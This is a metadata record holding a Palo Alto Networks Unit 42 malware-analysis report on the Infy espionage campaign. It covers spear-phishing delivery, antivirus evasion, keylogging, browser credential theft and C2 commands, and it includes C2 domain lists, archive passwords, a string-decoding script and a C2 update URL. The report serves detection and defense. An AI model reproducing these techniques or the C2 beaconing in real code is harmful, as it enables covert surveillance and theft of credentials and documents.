{
    "id": "e169dbc1-3a76-4d04-8da3-68e5f1f681fd",
    "created_at": "2023-01-12T15:04:09.191778Z",
    "updated_at": "2025-03-27T02:11:55.119104Z",
    "deleted_at": null,
    "sha1_hash": "98f631bc0d0bc0f658dc0f670fd2d4544617b1c6",
    "title": "2016-05-02 - Prince of Persia- Infy Malware Active In Decade of Targeted Attacks",
    "authors": "",
    "file_creation_date": "2022-05-27T21:11:53Z",
    "file_modification_date": "2022-05-27T21:11:53Z",
    "file_size": 1057862,
    "plain_text": "# Prince of Persia: Infy Malware Active In Decade of Targeted Attacks\n\n**[researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/](http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)**\n\nTomer Bar, Simon Conant May 2, 2016\n\nBy [Tomer Bar and](https://unit42.paloaltonetworks.com/author/tomer-bar/) [Simon Conant](https://unit42.paloaltonetworks.com/author/simon-conant/)\n\nMay 2, 2016 at 5:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [Infy,](https://unit42.paloaltonetworks.com/tag/infy/) [microsoft,](https://unit42.paloaltonetworks.com/tag/microsoft/) [WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\n\nAttack campaigns that have very limited scope often remain hidden for years. If only a few\nmalware samples are deployed, it’s less likely that security industry researchers will identify\nand connect them together.\n\nIn May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious\ndocuments from a genuine and compromised Israeli Gmail account, sent to an Israeli\nindustrial organization. One e-mail carried a Microsoft PowerPoint file named “thanks.pps”\n[(VirusTotal), the other a Microsoft Word document named “request.docx”.](https://www.virustotal.com/en/file/a1d5ab7125f002262151e516151e9b9223b3f5ca3863d69dd8a12b066c162906/analysis/)\n\nAround the same time, WildFire also captured an e-mail containing a Word document\n(“hello.docx”) with an identical hash as the earlier Word document, this time sent to a U.S.\nGovernment recipient.\n\nBased on various attributes of these files and the functionality of the malware they install, we\nhave identified and collected over 40 variants of a previously unpublished malware family we\ncall Infy, which has been involved in attacks stretching back to 2007. Attacks using this tool\nwere still active as of April 2016.\n\n## Attack Technique\n\nThe attacks we have identified carrying Infy begin with a spear-phishing e-mail carrying a\nWord or PowerPoint document. The attached document file contains a multi-layer SelfExtracting Executable Archive (SFX), and content attempting to social engineer the recipient\ninto activating the executable. In this example, the PPS file, when clicked, opens in\n“PowerPoint Show” mode. The user sees a PowerPoint page (Figure 1) that mimics a\npaused movie, and is tricked into clicking “Run” (Figure 2), which allows the embedded SFX\nfile to execute\n\n\n-----\n\n_Figure 1 PowerPoint page mimics a paused video_\n\n_Figure 2 User tricked into running embedded SFX EXE_\n\nOne of the SFX layers is encrypted with the key “1qaz2wsx3edc”. The package (Figure 3)\ntypically includes a fake readme.txt file as camouflage (for example, impersonating an\nAptana Studio application), and in some campaigns, image or video files (Figure 4). The\nexecutable typically has a filename pattern ins[*].exe where * are random digits of up to 4\ncharacters. The main payload is a DLL file with a typical filename pattern mpro[*].dll where *\nare random digits of up to 3 characters (early versions used a .cpl extension).\n\n\n-----\n\n_Figure 3 Embedded SFX contents_\n\n_Figure 4 Some campaigns include image or video files as camouflage_\n\nThe executable installs the DLL, writes to the autorun registry key, and doesn’t activate until\na reboot. After reboot, it first checks for antivirus and then connects to the C2. It starts\ncollecting environment data, initiates a keylogger, and steals browser passwords and content\nsuch as cookies, before exfiltrating the stolen data to the C2 server.\n\nThe initially-observed “thanks.pps” example tricks the user into running the embedded file\nnamed ins8376.exe which loads a payload DLL named mpro324.dll.\n\n## Infrastructure\n\nIn our initial samples, we observed C2 servers updateserver3[.]com and\nus1s2[.]strangled[.]net.\n\nOther campaigns use a combination of Dynamic DNS providers, third-party site hosting\nservices, and apparently first-party-registered domains as C2 servers.\n\nAnalysis of hosting and WHOIS data (Figure 5) led to a total of 12 related first-partyregistered domains used for C2 servers:\n\nbestbox3[.]com\nmyblog2000[.]com\nsafehostonline[ ]com\n\n\n-----\n\nupdateserver3[.]com\nshort-name[.]com\nbestupdateserver2[.]com\nbestwebstat[.]com\nupdatebox4[.]com\nbestupdateserver[.]com\nshort-url20[.]com\nupdateserver1[.]com\nbox4054[.]net\n\nAges of these domains suggest that some may have been used for malicious activity back as\nfar as early 2010.\n\n[We found a report by the Danish Defense Intelligence Service’s Center for Cybersecurity,](https://fe-ddis.dk/cfcs/CFCSDocuments/Phishing%20uden%20fangst.pdf)\nwhich had observed similar attacks against Danish Government targets, and documented a\nsmall portion of the same C2 infrastructure.\n\n\n-----\n\n_Figure 5 Infrastructure and Actor information related to Infy Attacks_\n\nWe initially found a file with an identical hash as the originally-observed PowerPoint file, but\na different filename (“syria.pps”), uploaded to VirusTotal (Figure 6) also in May of 2015. A\ncharacteristic observed across these campaigns is that the actor puts deliberate effort into\nthe specific geographic targeting, with region-specific attack content.\n\n\n-----\n\n_Figure 6 Powerpoint file uploaded to VirusTotal with a different file name_\n\nWe were subsequently able to pivot and associate additional malware and campaigns based\non infrastructure, hashes, strings, and payload links and similarities. The most conclusive\nevidence that all of these are linked is found in a single key, used to encode strings within the\nmalware across all examples. Only the offset varies: older versions encode just the C2 data,\nnewer versions encode most strings, and some double-encode the C2 data with two different\noffsets. The following script can be used to decode these strings:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nimport string\nimport base64\nFIRST_PHASE =\n\"OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge\"\nSECOND_PHASE = \"\" +\n\"PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb“\ndef decrypt(input, offset=-10):\nresult = \"\"\nfor i, c in enumerate(input):\ni = i % 62 + 1\ntry:\nindex = FIRST_PHASE.index(c)\nexcept ValueError:\nresult += c\ncontinue\ntranslated = SECOND_PHASE[(index - i + offset) % len(SECOND_PHASE)]\nresult += translated\nreturn result\n\n\nBased on this specific encoding technique and key, we have identified related Infy samples\nfrom as early as mid 2007 (Figure 7), although more frequent related activity is observed\nafter 2011. Historic registration of the C2 domain associated with the oldest sample that we\nfound, fastupdate[.]net, suggests that it may have been associated with malicious activity as\nfar back as December 2004.\n\nOver the years, we notice continued development and feature improvement in the code. For\ninstance, support for the new Microsoft Edge browser was recently introduced in “version\n30”.\n\n\n-----\n\n_Figure 7 Oldest related example found dates to 2007_\n\nMost of the associated malware samples dating back over the last five years were eventually\ndetected by antivirus programs, but in most cases with a generic signature. Other examples\nare named with multiple unrelated signature classifications, including Win32/Tuax.A (very old\nversions), W32/ADOKOOB, Win32/Cloptern.A & B (old versions), TR/Graftor.106254,\nTR/Spy.Arpnatis.A, and Win32/Skeeyah.A!bit.\n\nWe refer to the malware as “Infy” because the actor used this string in multiple locations,\nincluding filenames (“infy74f1.exe” - Infy version 7.4 F1), C2 strings (“subject=INFY M 7.8”),\nand C2 folder names.\n\n## Attribution\n\nThe Gmail account sending the emails in the attack that we first observed (Figure 8), belongs\nto an Israeli victim. That account was itself victim of an e-mail-borne attack that compromised\nthe user's system and e-mail account.\n\n_Figure 8 First-observed attack, via email_\n\nAmong WHOIS records for first-party domains used in the C2 infrastructure, we find three\nemail accounts bearing a strong similarity in naming pattern:\n\n\n-----\n\nThe WHOIS records with the first two email addresses (and other C2 domains) have\napparently fake WHOIS content. The “aminjalali_58 (at) yahoo.com” email address is\nassociated with 6 known C2 domains, dating back to 2010. Unlike the fake WHOIS\nexamples, this example has content more consistent with the email address:\n\n_amin jalali_\n_safehostonline_\n_afriqa street number 68_\n_tehran_\n_Tehran_\n_19699_\n_IR_\n_+98.935354252_\n_aminjalali_58 (at) yahoo.com_\n\nThe name “Amin Jalali” is not unique, though it does appear to have Iranian-specific origins.\nWe find profiles and artifacts combining the name and “58”, which may (or may not) be the\nsame individual, and all of which have Iranian links.\n\nWhen we look at domains on neighboring IP addresses from known first-party C2s, we\nobserve numerous Iranian domains, suggesting possibly an Iranian hosting reseller – and in\nat least one case, a free Iranian web host (Figure 9).\n\n_Figure 9 Neighbor IP addresses with Iranian domains_\n\n## Conclusion\n\nWe have enough evidence to conclude a pattern of behavior following extensive analysis of\nthis malware and C2 infrastructure between these samples. The activity has been observed\nover almost 10 years, with the malware being constantly improved and developed. The lowvolume of activity, deliberate campaign focus and content tailoring, and nature of targets\nhints at the goals of this actor.\n\n\n-----\n\nWe believe that we have uncovered a decade-long operation that has successfully stayed\nunder the radar for most of its existence as targeted espionage originating from Iran. It is\naimed at governments and businesses of multiple nations as well as its own citizens.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n1. WildFire accurately identifies all malware samples related to this operation as\n\nmalicious.\n2. Domains used by this operation have been flagged as malicious in Threat Prevention.\n3. AutoFocus users can view malware related to this attack using the “Infy tag.\n\nIOCs can be found in the appendices of this report.\n\nSpecial thanks to Michael Scott for assistance with Maltego in this investigation.\n\n## Appendix 1 - Detailed Infy Malware Analysis\n\nAlthough Infy is fundamentally one malware family, we observe two distinct variants. The\nregular variant “Infy” is versioned by the malware author 1-30 (1999 -15999 sub-versions). In\naddition, we observe a distinct variant “Infy M” developed in parallel with the regular variant\nsince about 2013. Infy M appears to be a full featured variant, deployed against high-value\ntargets. It includes more functionality: while the original variant has no remote control, “M”\nadds the ability for the C2 to issue commands to the malware via C2 PHP scripts; HTTP\nsupport; a hidden GUI control panel; and FTP client.\n\n**Infy**\n\nDetailed analysis of a recent Infy sample (version 30, active from 24 February 2016):\n\nThe initial executable first checks for installed antivirus programs. It uses the Windows API\nfunction “GetFileattributeA” on a list of several common AV installation directories, testing\nany positive return with “file_attribute_directory\". Depending on which AV Infy finds, it will\neither abort, or install the malicious Infy DLL using a different technique. This concern with\navoiding client-AV detection, skipping installation rather than risk alerting, is somewhat\nnoteworthy (as opposed to the relatively common sandbox-detection techniques). The EXE\ninstalls the DLL, writes to the autorun key, and does nothing else until restart.\n\nUpon restart, the EXE loader executes the main function, exported by the DLL malware file\nDLL (previously we observed functions named “start1/start2/start3”) with the parameter /rcv\n(this version uses a decryption offset of 19). It installs itself in “cyberlink” directory.\n\nIt will then search for files with “bak”, “csv”, or “cnt”, extensions. If the parameter “/rcv” was\nused, it starts a keylogger (the keylogger uses a window name “TRON2VDLLB”\n(GetMessageA/translate message/DispatchMessageA). It next registers hotkeys, and gets\n\n\n-----\n\nclipboard data. Get_browser_data steals passwords, forms, cookies, history (from Microsoft\nEdge, Internet Explorer, Google Chrome, Opera, and Firefox).\n\nThe malware connects to the C2 every five minutes using HTTP, posting:\n\n<computer name>\n<user name>\ndn = n1\nver = 30\nlfolder= f\ncpuid=\nmachineguid (from hklm\\SOFTWARE\\Microsoft\\Cryptography\\machineguid)\ntt= time\n\nAfter posting data about the infected system to the C2 server, the malware downloaded an\nupdate named “v30nXf1.tmp” file to %temp%\\drvtem64.tmp. If the download is successful,\nthe malware writes “OK, Downloaded [url file]” to log file. It then connects again, with a\nsimilar posting format, but this time also adding “tt=” (time) and “cpuid=”. It installs the\ndownloaded file with parameter \"-sp/ins -pBA5a88E\". A third connection adds “sfolder”,\n“subject”, and this time exfiltrates data in the “body=” parameter.\n\nEach variant of Infy uses specific “cover” camouflage to with file metadata that makes it\nappear as though it is legitimate software. In this case, the file used the software name\n“Cyberlink,” and a description of “CLMediaLibrary Dynamic Link Library” and listing version\n4.19.9.98.\n\n**Infy M**\n\nWe observed the Infy M variant with versions 6.1 through 7.8, adding features including\nscreen capture, document capture & upload, and microphone capture. Infy M supports the\nfollowing C2 commands:\n\nASIDLE - idle\n\nASDIR – directory list of files\n\nASPUT – download file\n\nASGET – upload file\n\nASZIPGET – upload as zip\n\nASDELETE – delete file\n\nASRENAME – rename file\n\nASRUN – execute file\n\nASENDTASK – terminate process\n\nASZIP – zip file\n\nASSHELL – remote shell\n\n\n-----\n\nThe M variant uses mostly distinct C2 servers from the regular Infy samples (although very\nrecently, we also observed version 7.8 using C2 “youripinfo.com”, previously seen as C2 for\nthe regular variant):\n\nbestupdateserver[.]com – Observed 2013-12-09\nwww.bestupdateserver[.]com - Observed 2013-04-26\nbestbox3[.]com – Observed 2015-08-25\nwww.bestupdateserver2[.]com - Observed 2015-05-22\nbestupdateserver2[.]com – Observed 2014-07-16\n\n**Analysis of an early version of “M”, 6.2**\n\nVersions 6.x of the Infy M variant camouflage themselves with file and window names set to\nBorland hcrtf. They use a single EXE, rather than a loader EXE and payload DLL as seen in\nthe original variant. The malware initially performs a check to see if the victim as already\ninfected by checking for window names “Borland hcrtf 6.x” or “Macromedia Swsoc 7.x”.\n\nWe have identified five hidden GUI control forms in Infy M, one of which is not used. The first\nform includes three possible parameters. Parameter “/ins” installs the Trojan. It first creates\nand starts the service and on Windows versions prior to Vista it requires the “/s” parameter.\nAfter installing itself, the malware deletes any previous Infy installations. The does this by\nterminating processes and deleting Infy files in %system32%, %appdata%, %appdata%\\hcrtf\n(for example, pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll).\nIt then renames the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the\n“inverse Ser32”, “grep”, and “hcrtf” services. Finally, it downloads and executes the update\nfile from the C2 at /infy/update.php.\n\nThe /c (copy) parameter sets up autostart for the malware by writing to registry key “run”\n(Windows Vista and above) or “runservices” (versions prior to Windows Vista). The /s\n(service) parameter creates and starts the service (Windows Vista and later). At this point,\nthe malware waits, and handles any commands issued over HTTP from the C2 (for example,\nexecute a remote shell upon receiving command “ASSHELL”).\n\nThe second form monitors for new or modified document files using\n“CreateIoCompletionPort” and “ReadDirectoryChangesW”. It targets document file types\n.doc, .xls, .jpg, .jpe, .txt, .htm, .pgp, .pdf, .zip, and .rar and ZIP compresses them (using the\npassword “Z8(2000_2001uI”) into a file located at \\Program\nFiles\\Yahoo!\\Messenger\\Profiles\\yfsbg\\yfsbg\\3dksf.tmp.\n\nThe third form takes a screen captures and stores it the “yfsbg” folder as 4dksf.tmp. It the\nuploads the screenshot and document-capture files using POST (instead of using GET as\nseen in the regular variants) to <C2 server>/infy/fms.php.\n\nThe fourth form is not used. The fifth form is used for microphone capture.\n\n\n-----\n\nThe 7.x versions install themselves as swsoc.exe (7.4 also seen using infy74f1.exe) at\n<documents and settings>\\all users\\application data\\macromedia\\8080\\swsoc.exe. They also\ncreate a subfolder “fsbg”, where they store the copies of documents opened by the user.\nThese are stored with their CRC value as their filename, RAR compressed with the same\npassword “Z8(2000_2001uI”.\n\nWe observed a server reply with error in the PHP, giving us some of their underlying file\nstructure:\n\n<b>Warning</b>: Cannot modify header information - headers already sent by (output\nstarted at /home/bestupda/public_html/infy/fms.php:115) in\n<b>/home/bestupda/public_html/infy/fms.php</b> on line <b>116</b><br />\n\nUpgrade requests are observed with this syntax (here, version 6.2 to the latest version):\n\nhttp://www.bestupdateserver.com/infy/update.php?cn=\n<computername>&ver=6.2&u=27/3/2016 20:37:23\n\n## Appendix 2 – Observed Hashes\n\n[A list of hashes for associated files observed in this operation can be found here.](https://github.com/pan-unit42/iocs/blob/master/prince_of_persia/hashes.csv)\n\n## Appendix 3 – Observed Infy C2 Domains\n\nanalyse1[.]mooo[.]com\n\nbest[.]short-name[.]com\n\nbest2[.]short-name[.]com\n\nbest2[.]short-url20[.]com\n\nbest3[.]short-url20[.]com\n\nbest4[.]short-url20[.]com\n\nbest5[.]short-url20[.]com\n\nbest6[.]short-url20[.]com\n\nbest7[.]short-url20[.]com\n\nbestbox3[.]com\n\nbestupdateserver[.]com\n\nbestupdateserver2[.]com\n\nbestupser[.]awardspace[.]info\n\nbestwebstat[.]com\n\nbl2pe[.]bestwebstat[.]com\n\nbox4054[.]net\n\nc1[.]short-url20[.]com\n\ndbook[.]soon[.]it\n\ndsite[.]dyx[.]comextd[.]mine[.]bz\n\nfastecs[.]netfirms[.]com\n\n\n-----\n\nfastupdate[.]net\ngstat[.]strangled[.]net\nlost[.]updateserver1[.]com\nlu[.]ige[.]es\nmand[.]pwnz[.]org\nmyblog2000[.]com\nns2[.]myblog2000[.]com\nnus[.]soon[.]it\nsafehostonline[.]com\nsecup[.]soon[.]it\nshort-name[.]com\nshort-url20[.]com\nupdate[.]info[.]gf\nupdatebox4[.]com\nupdateserver1[.]com\nupdateserver3[.]com\nus1[.]short-name[.]com\nus12[.]short-url20[.]com\nus13[.]short-url20[.]com\nus15[.]short-url20[.]com\nus16[.]short-url20[.]com\nus1s2[.]strangled[.]net\nwep[.]archvisio[.]com\nwep[.]soon[.]it\nwpstat[.]mine[.]bz\nwpstat[.]strangled[.]net\nwww[.]fastupdate[.]net\nwww[.]updateserver1[.]com\nyouripinfo[.]com\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-05-02 - Prince of Persia- Infy Malware Active In Decade of Targeted Attacks.pdf"
    ],
    "report_names": [
        "2016-05-02 - Prince of Persia- Infy Malware Active In Decade of Targeted Attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535849,
    "ts_updated_at": 1743041515,
    "ts_creation_date": 1653685913,
    "ts_modification_date": 1653685913,
    "files": {
        "pdf": "https://archive.orkl.eu/98f631bc0d0bc0f658dc0f670fd2d4544617b1c6.pdf",
        "text": "https://archive.orkl.eu/98f631bc0d0bc0f658dc0f670fd2d4544617b1c6.txt",
        "img": "https://archive.orkl.eu/98f631bc0d0bc0f658dc0f670fd2d4544617b1c6.jpg"
    }
}